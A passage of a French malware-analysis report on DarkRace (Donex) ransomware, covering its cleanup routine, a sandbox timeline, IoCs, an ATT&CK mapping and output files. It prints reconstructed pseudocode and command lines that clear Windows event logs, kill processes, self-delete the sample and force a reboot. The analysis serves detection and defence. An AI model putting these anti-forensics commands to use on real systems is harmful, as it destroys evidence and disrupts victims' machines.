## 9. Cleanup final `sub_402F40` (reboot observé)

```c
if (config["delete_eventlogs"] == "true") {
  for (log in {"application","system","security"})
    ClearEventLogA(OpenEventLogA(0, log), 0);
}

WinExec("cmd /c \"taskkill /f /im cmd.exe & taskkill /f /im conhost.exe\"", 0);
Sleep(2000);

if (config["shutdown_system"] == "true")
  cmd = "cmd /c \"ping 127.0.0.1 & del C:\\ProgramData\\1.bat & del %s & shutdown -r -f -t 0\"";
else
  cmd = "cmd /c \"ping 127.0.0.1 & del C:\\ProgramData\\1.bat & del %s\"";
// %s = chemin du malware (self-delete)
WinExec(cmd, 0);
ExitProcess(0);
```

**Any.RUN :**
- signature *Starts CMD.EXE for self-deleting*
- *The system shut down or reboot*
- **screen_15** (conservé) : écran de login Windows après le reboot forcé

---

## 10. Timeline sandbox (reconstruite)

```
t0     Lancement PE (PID 7008), console cachée
t0+ε   Mutex CheckMutex, XOR config, VSS delete (si admin)
t0+ε   Drop icon.ico + assoc .3fe57B660
t0+ε   Drop/exec C:\ProgramData\1.bat → taskkill loop + ping
t0+…   Walk Desktop/Documents/… → encrypt + Readme
       (Any.RUN: currencypost.rtf.3fe57B660, Database1.accdb.3fe57B660, …)
t_end  Clear event logs, self-delete, shutdown -r
       → reboot → écran de login (screen_15)
```

**Réseau malware :** aucun C2. Les HTTP Any.RUN sont du bruit Windows (Bing, OCSP, WNS, login.live…). Contact opérateur = TOR/Tox/mail dans la note uniquement.

---

## 11. IoCs

```
SHA256  74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3
MD5     cb1c423268b1373bde8a03f36f66b495
Mutex   CheckMutex
Ext     .3fe57B660
Note    Readme.3fe57B660.txt
Paths   C:\ProgramData\1.bat
        C:\ProgramData\icon.ico
Email   darkrace@onionmail.org
Onion   wkrlpub5k52rjigwxfm6m7ogid55kamgc5azxlq7zjgaopv33tgx2sqd.onion
YARA    DONEX (Any.RUN)
```

Module RSA (début) : `C5A0A7250BB5E100D5B01B4213804705...`

---

## 12. Captures Any.RUN (après tri)

Dossier local : `anyrun_screenshots/` — **2 JPEG** conservés (1360×768).

| # | Fichier | Contenu | Rôle dans le rapport |
|---|---------|---------|----------------------|
| 05 | `screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg` | Bureau chiffré : nombreux `*.3fe57B660`, icônes custom, **Notepad** ouvert sur `Readme.3fe57B660.txt` (note DarkRace : onion / Tox / `darkrace@onionmail.org`) | Preuve d’impact + contenu de la rançon |
| 15 | `screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg` | Écran de **login Windows** post-infection | Preuve du `shutdown -r` (`shutdown_system=true`) |

```
anyrun_screenshots/
├── screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg   ← chiffrement + note
└── screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg   ← reboot / login
```

Les autres captures Any.RUN (avant infection, écrans noirs, WinRE) ont été écartées lors du tri.

---

## 13. ATT&CK (mapping rapide)

| Technique | ID | Preuve |
|-----------|-----|--------|
| Masquer fenêtre | T1564.003 | `ShowWindow(SW_HIDE)` |
| Clear Event Logs | T1070.001 | `ClearEventLogA` |
| Inhibit System Recovery | T1490 | `vssadmin` / `wmic shadowcopy` |
| Service Stop | T1489 | stop `vss`, backup, … |
| Data Encrypted for Impact | T1486 | Salsa20 + RSA footer |
| Indicator Removal (self-delete) | T1070 | `del %malware%` |
| System Shutdown/Reboot | T1529 | `shutdown -r -f -t 0` |

---

## 14. Fichiers produits dans ce dossier

```
anyrun_screenshots/
  screen_05_27824fef-7b8a-4606-ba19-3c46db926211.jpg
  screen_15_77383982-f21f-4f6e-a7c8-720d50fd7f6c.jpg
1.bat                                  ← reconstruit (C:\ProgramData\1.bat)
darkrace_config_decrypted.xml          ← config XML complète
darkrace_config_readable.xml           ← idem, <ico> tronqué
extract_config.py                      ← re-extraction XOR 0xA9
overlay_rsa_pubkey.bin                 ← overlay PE 527 o (n|e|ext)
overlay_rsa_n.hex                      ← module RSA-2048 (hex)
overlay_extension.txt                  ← 3fe57B660
rsa_public_key.pem                     ← pubkey SPKI (PEM)
rsa_public_key_pkcs1.pem               ← pubkey PKCS#1 (PEM)
rsa_public_key.der                     ← pubkey DER
rsa_public_key.txt                     ← fiche n/e/PEM/ext
README.md                              ← ce document (français)
README_EN.md                           ← version anglaise
74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3
74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3.c
```

---

*Fin du rapport.*
